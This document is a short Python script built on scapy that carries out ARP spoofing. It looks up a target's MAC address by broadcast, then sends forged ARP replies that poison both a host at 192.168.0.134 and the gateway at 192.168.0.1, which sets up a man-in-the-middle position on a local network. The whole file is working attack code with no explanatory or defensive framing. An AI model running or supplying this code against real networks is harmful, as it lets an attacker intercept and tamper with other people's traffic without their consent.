#!/usr/bin/env python 

import scapy.all as scapy

def	get_mac(ip):
	arp_request_broadcast = (scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/
		scapy.ARP(pdst=ip, hwlen=6, plen=4))
	answered = scapy.srp1(arp_request_broadcast, timeout=1, verbose=False)

	return answered[0].hwsrc 

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip,
		hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

	



spoof("192.168.0.134", "192.168.0.1")
spoof("192.168.0.1", "192.168.0.134")

